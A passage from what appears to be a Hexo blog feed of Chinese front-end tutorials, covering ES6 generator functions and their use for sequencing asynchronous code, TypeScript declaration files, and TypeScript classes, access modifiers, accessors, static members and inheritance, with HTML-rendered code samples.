class="attr">value</span>: <span class="literal">undefined</span>, <span class="attr">done</span>: <span class="literal">true</span>&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> v <span class="keyword">of</span> classes) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="生成器函数"><a href="#生成器函数" class="headerlink" title="生成器函数"></a>生成器函数</h1><p>生成器是一个特殊的函数</p><p>异步编程纯回调函数node fs ajax mongodb</p><p>声明函数比较特殊</p><p>执行函数也比较特殊</p><p>示例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成器函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> * <span class="title">gen</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;我是生成器函数&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> iterators = gen()</span><br><span class="line">iterators.next()</span><br></pre></td></tr></table></figure><p>gen()会返回一个迭代器，使用迭代器的nex()方法才能使函数进行调用</p><p>里面可以使用yield语句进行代码执行控制就像迭代器一样一个nex()就执行一个yield语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> * <span class="title">gen</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;111&#x27;</span>);</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;哈哈哈&#x27;</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;222&#x27;</span>);</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;哼哼哼&#x27;</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;333&#x27;</span>);</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;是事实&#x27;</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;444&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> iterators = gen()</span><br><span class="line">iterators.next()</span><br><span class="line">iterators.next()</span><br><span class="line">iterators.next()</span><br><span class="line">iterators.next()</span><br><span class="line"></span><br><span class="line"><span class="comment">//es6.js:&#123;value: &#x27;哈哈哈&#x27;, done: false&#125;</span></span><br><span class="line"><span class="comment">//es6.js:67 222</span></span><br><span class="line"><span class="comment">//es6.js:75 &#123;value: &#x27;哼哼哼&#x27;, done: false&#125;</span></span><br><span class="line"><span class="comment">//es6.js:69 333</span></span><br><span class="line"><span class="comment">//es6.js:76 &#123;value: &#x27;是事实&#x27;, done: false&#125;</span></span><br><span class="line"><span class="comment">//es6.js:71 444</span></span><br><span class="line"><span class="comment">//es6.js:77 &#123;value: undefined, done: true&#125;</span></span><br></pre></td></tr></table></figure><p>当然我们也可以选择循环遍历</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成器函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> * <span class="title">gen</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;111&#x27;</span>);</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;哈哈哈&#x27;</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;222&#x27;</span>);</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;哼哼哼&#x27;</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;333&#x27;</span>);</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;是事实&#x27;</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;444&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> v <span class="keyword">of</span> gen()) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(v);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="生成器函数参数"><a href="#生成器函数参数" class="headerlink" title="生成器函数参数"></a>生成器函数参数</h2><p>next()方法可以传递实参, <code>将作为上一个yield的返回结果</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成器函数参数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> * <span class="title">gen2</span>(<span class="params">arg</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(arg);</span><br><span class="line">    <span class="keyword">let</span> one = <span class="keyword">yield</span> <span class="number">111</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(one);</span><br><span class="line">    <span class="keyword">let</span> tow = <span class="keyword">yield</span> <span class="number">222</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(tow);</span><br><span class="line">    <span class="keyword">let</span> send = <span class="keyword">yield</span> <span class="number">333</span></span><br><span class="line">    <span class="built_in">console</span>.log(send);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> iterator2 = gen2(<span class="string">&quot;AAA&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(iterator2.next());</span><br><span class="line"><span class="comment">// next()方法可以传递实参, 将作为上一个yield的返回结果</span></span><br><span class="line"><span class="built_in">console</span>.log(iterator2.next(<span class="string">&#x27;BBBB&#x27;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(iterator2.next(<span class="string">&#x27;CCCC&#x27;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(iterator2.next(<span class="string">&#x27;DDDD&#x27;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="生成器异步编程"><a href="#生成器异步编程" class="headerlink" title="生成器异步编程"></a>生成器异步编程</h2><p>不考虑生成器异步编程</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 异步编程</span></span><br><span class="line"><span class="built_in">setTimeout</span>( <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line">        &#125;, <span class="number">3000</span>);</span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;, <span class="number">1000</span> )</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>这个一直回调， 被称为回调地狱</p></blockquote><p>使用生成器函数完成异步操作</p><p>可以解决回调地狱问题</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">        run.next()</span><br><span class="line"></span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">        run.next()</span><br><span class="line"></span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run3</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line">        run.next()</span><br><span class="line"></span><br><span class="line">    &#125;, <span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> * <span class="title">genRun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">yield</span> run1();</span><br><span class="line">    <span class="keyword">yield</span> run2();</span><br><span class="line">    <span class="keyword">yield</span> run3();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> run = genRun()</span><br><span class="line">run.next()</span><br></pre></td></tr></table></figure><p>按顺序进行异步操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">run1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> data = <span class="string">&#x27;订单&#x27;</span></span><br><span class="line">            run.next(data)</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">run2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> data = <span class="string">&#x27;订单数据&#x27;</span></span><br><span class="line">            run.next(data)</span><br><span class="line"></span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">run3</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> data = <span class="string">&#x27;商品数据&#x27;</span></span><br><span class="line">            run.next(data)</span><br><span class="line"></span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> * <span class="title">genRun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> user =  <span class="keyword">yield</span> run1();</span><br><span class="line">        <span class="built_in">console</span>.log(user);</span><br><span class="line">        <span class="keyword">let</span> ordes = <span class="keyword">yield</span> run2();</span><br><span class="line">        <span class="built_in">console</span>.log(ordes);</span><br><span class="line">        <span class="keyword">let</span> foodes = <span class="keyword">yield</span> run3();</span><br><span class="line">        <span class="built_in">console</span>.log(foodes);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> run = genRun()</span><br><span class="line">    run.next()</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">es6.js:131 订单</span></span><br><span class="line"><span class="comment">es6.js:131 订单数据</span></span><br><span class="line"><span class="comment">es6.js:133 商品数据</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript文件声明</title>
      <link href="/2022/03/18/TypeScript%E6%96%87%E4%BB%B6%E5%A3%B0%E6%98%8E/"/>
      <url>/2022/03/18/TypeScript%E6%96%87%E4%BB%B6%E5%A3%B0%E6%98%8E/</url>
      
        <content type="html"><![CDATA[<center> <h1>TS文件声明</h1></center><h1 id="声明文件"><a href="#声明文件" class="headerlink" title="声明文件"></a>声明文件</h1><p>当使用第三方库文件时，我们需要引用它的声明文件，才能获得相对应的代码补全、接口提示等功能。</p><p>声明语句：如果需要ts对新语法进行检查，需要加载了对应的类型说明代码</p><p><code>declare var jQuery: (selector: string) =&gt; any</code></p><p>声明文件: 把声明语句放在一个单独的文件(jQuery.d.ts)中，ts会自动解析到项目中所有声明文件</p><p>下载声明文件</p><p><code>npm install @types/jquery --save-dev</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jQuery <span class="keyword">from</span> <span class="string">&#x27;jquery&#x27;</span></span><br><span class="line">jQuery(<span class="string">&#x27;选择器&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScrip面向对象</title>
      <link href="/2022/03/17/TypeScript%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
      <url>/2022/03/17/TypeScript%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<center><h1>TypeScrip面向对象</h1></center><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>对于传统的javaScript程序我们会使用<code>函数</code>和基于原型来创建可重用的组件，但是对于面向对象方式的程序员使用这些语法就有点棘手。</p><p>要想面向对象，操作对象，首先便要拥有对象，那么下一个问题就是如何创建对象。要创建对象，必须要先定义类，所谓的类可以理解为对象的模型，程序中可以根据类创建指定类型的对象，举例来说：可以通过Person类来创建人的对象，通过Dog类创建狗的对象，通过Car类来创建汽车的对象，不同的类可以用来创建不同的对象。</p><ul><li><p>定义类：</p><ul><li>```typescript<br>class 类名 {<pre><code>属性名: 类型;constructor(参数: 类型)&#123;    this.属性名 = 参数;&#125;方法名()&#123;    ....&#125;</code></pre>}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 示例：</span><br><span class="line"></span><br><span class="line">  - ```typescript</span><br><span class="line">    class Person&#123;</span><br><span class="line">        name: string;</span><br><span class="line">        age: number;</span><br><span class="line">    </span><br><span class="line">        constructor(name: string, age: number)&#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">            this.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        sayHello()&#123;</span><br><span class="line">            console.log(`大家好，我是$&#123;this.name&#125;`);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>使用类：</p><ul><li>```typescript<br>const p = new Person(‘孙悟空’, 18);<br>p.sayHello();<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 面向对象的特点</span><br><span class="line"></span><br><span class="line">## 多态</span><br><span class="line"></span><br><span class="line">父类型的引用指向了子类型对象， 不同类型中的对象相同的方法产生了不同的行为</span><br><span class="line"></span><br><span class="line">定义一个父类</span><br><span class="line"></span><br><span class="line">```tsx</span><br><span class="line">class Animal&#123;</span><br><span class="line">        // 定义一个属性</span><br><span class="line">        name :string</span><br><span class="line">        constructor(name :string)&#123;</span><br><span class="line">            this.name = name</span><br><span class="line">        &#125;</span><br><span class="line">        run(distance : number = 0): void&#123;</span><br><span class="line">            console.log(`跑了$&#123;distance&#125;米`, this.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br></pre></td></tr></table></figure></li></ul></li></ul><p>定义两个子类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Dog extends Animal&#123;</span><br><span class="line">        constructor(name : string)&#123;</span><br><span class="line">            super(name)</span><br><span class="line">        &#125;</span><br><span class="line">        run(distance: number = 5): void &#123;</span><br><span class="line">            console.log(`跑了$&#123;distance&#125;米`, this.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">class Pig extends Animal&#123;</span><br><span class="line">        constructor(name: string)&#123;</span><br><span class="line">            super(name)</span><br><span class="line">        &#125;</span><br><span class="line">        run(distance: number = 10): void &#123;</span><br><span class="line">            console.log(`跑了$&#123;distance&#125;米`, this.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>普通实例调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const animal: Animal = new Animal(&#x27;动物&#x27;);</span><br><span class="line">const dog: Dog = new Dog(&#x27;狗&#x27;)</span><br><span class="line">const pig: Pig = new Pig(&#x27;猪&#x27;)</span><br><span class="line">animal.run()</span><br><span class="line">dog.run()</span><br><span class="line">pig.run()</span><br></pre></td></tr></table></figure><p>多态类型调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const dog : Animal = new Dog(&#x27;狗&#x27;)</span><br><span class="line">    dog.run()</span><br></pre></td></tr></table></figure><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><ul><li><p>对象实质上就是属性和方法的容器，它的主要作用就是存储属性和方法，这就是所谓的封装</p></li><li><p>默认情况下，对象的属性是可以任意的修改的，为了确保数据的安全性，在TS中可以对属性的权限进行设置</p></li><li><p>只读属性（readonly）：</p><ul><li>如果在声明属性时添加一个readonly，则属性便成了只读属性无法修改</li></ul></li><li><p>TS中属性具有三种修饰符：</p><ul><li>public（默认值），可以在类、子类和对象中修改</li><li>protected ，可以在类、子类中修改</li><li>private ，可以在类中修改</li></ul></li><li><p>示例：</p><ul><li><p>public</p><ul><li>```typescript<br>class Person{<pre><code>public name: string; // 写或什么都不写都是publicpublic age: number;constructor(name: string, age: number)&#123;    this.name = name; // 可以在类中修改    this.age = age;&#125;sayHello()&#123;    console.log(`大家好，我是$&#123;this.name&#125;`);&#125;</code></pre>}class Employee extends Person{<pre><code>constructor(name: string, age: number)&#123;    super(name, age);    this.name = name; //子类中可以修改&#125;</code></pre>}const p = new Person(‘孙悟空’, 18);<br>p.name = ‘猪八戒’;// 可以通过对象修改<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- protected</span><br><span class="line"></span><br><span class="line">  - ```typescript</span><br><span class="line">    class Person&#123;</span><br><span class="line">        protected name: string;</span><br><span class="line">        protected age: number;</span><br><span class="line">    </span><br><span class="line">        constructor(name: string, age: number)&#123;</span><br><span class="line">            this.name = name; // 可以修改</span><br><span class="line">            this.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        sayHello()&#123;</span><br><span class="line">            console.log(`大家好，我是$&#123;this.name&#125;`);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    class Employee extends Person&#123;</span><br><span class="line">    </span><br><span class="line">        constructor(name: string, age: number)&#123;</span><br><span class="line">            super(name, age);</span><br><span class="line">            this.name = name; //子类中可以修改</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    const p = new Person(&#x27;孙悟空&#x27;, 18);</span><br><span class="line">    p.name = &#x27;猪八戒&#x27;;// 不能修改</span><br></pre></td></tr></table></figure></li></ul></li><li><p>private</p><ul><li>```typescript<br>class Person{<pre><code>private name: string;private age: number;constructor(name: string, age: number)&#123;    this.name = name; // 可以修改    this.age = age;&#125;sayHello()&#123;    console.log(`大家好，我是$&#123;this.name&#125;`);&#125;</code></pre>}class Employee extends Person{<pre><code>constructor(name: string, age: number)&#123;    super(name, age);    this.name = name; //子类中不能修改&#125;</code></pre>}const p = new Person(‘孙悟空’, 18);<br>p.name = ‘猪八戒’;// 不能修改<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">## 属性存取器</span><br><span class="line"></span><br><span class="line">- 对于一些不希望被任意修改的属性，可以将其设置为private</span><br><span class="line"></span><br><span class="line">- 直接将其设置为private将导致无法再通过对象修改其中的属性</span><br><span class="line"></span><br><span class="line">- 我们可以在类中定义一组读取、设置属性的方法，这种对属性读取或设置的属性被称为属性的存取器</span><br><span class="line"></span><br><span class="line">- 读取属性的方法叫做setter方法，设置属性的方法叫做getter方法</span><br><span class="line"></span><br><span class="line">- 示例：</span><br><span class="line"></span><br><span class="line">  - ```typescript</span><br><span class="line">    class Person&#123;</span><br><span class="line">        private _name: string;</span><br><span class="line">    </span><br><span class="line">        constructor(name: string)&#123;</span><br><span class="line">            this._name = name;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        get name()&#123;</span><br><span class="line">            return this._name;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        set name(name: string)&#123;</span><br><span class="line">            this._name = name;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    const p1 = new Person(&#x27;孙悟空&#x27;);</span><br><span class="line">    console.log(p1.name); // 通过getter读取name属性</span><br><span class="line">    p1.name = &#x27;猪八戒&#x27;; // 通过setter修改name属性</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h2 id="静态属性"><a href="#静态属性" class="headerlink" title="静态属性"></a>静态属性</h2><ul><li><p>静态属性（方法），也称为类属性。使用静态属性无需创建实例，通过类即可直接使用</p></li><li><p>静态属性（方法）使用static开头</p></li><li><p>示例：</p><ul><li>```typescript<br>class Tools{<pre><code>static PI = 3.1415926;static sum(num1: number, num2: number)&#123;    return num1 + num2&#125;</code></pre>}console.log(Tools.PI);<br>console.log(Tools.sum(123, 456));<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## this</span><br><span class="line"></span><br><span class="line">- 在类中，使用this表示当前对象</span><br><span class="line"></span><br><span class="line">## 继承</span><br><span class="line"></span><br><span class="line">- 继承时面向对象中的又一个特性</span><br><span class="line"></span><br><span class="line">- 通过继承可以将其他类中的属性和方法引入到当前类中</span><br><span class="line"></span><br><span class="line">  - 示例：</span><br><span class="line"></span><br><span class="line">    - ```typescript</span><br><span class="line">      class Animal&#123;</span><br><span class="line">          name: string;</span><br><span class="line">          age: number;</span><br><span class="line">      </span><br><span class="line">          constructor(name: string, age: number)&#123;</span><br><span class="line">              this.name = name;</span><br><span class="line">              this.age = age;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      class Dog extends Animal&#123;</span><br><span class="line">      </span><br><span class="line">          bark()&#123;</span><br><span class="line">              console.log(`$&#123;this.name&#125;在汪汪叫！`);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      const dog = new Dog(&#x27;旺财&#x27;, 4);</span><br><span class="line">      dog.bark();</span><br></pre></td></tr></table></figure></li></ul></li><li><p>通过继承可以在不修改类的情况下完成对类的扩展</p></li></ul><h2 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h2><ul><li><p>发生继承时，如果子类中的方法会替换掉父类中的同名方法，这就称为方法的重写</p></li><li><p>示例：</p><ul><li>```typescript<br>class Animal{<pre><code>name: string;age: number;constructor(name: string, age: number)&#123;    this.name = name;    this.age = age;&#125;run()&#123;    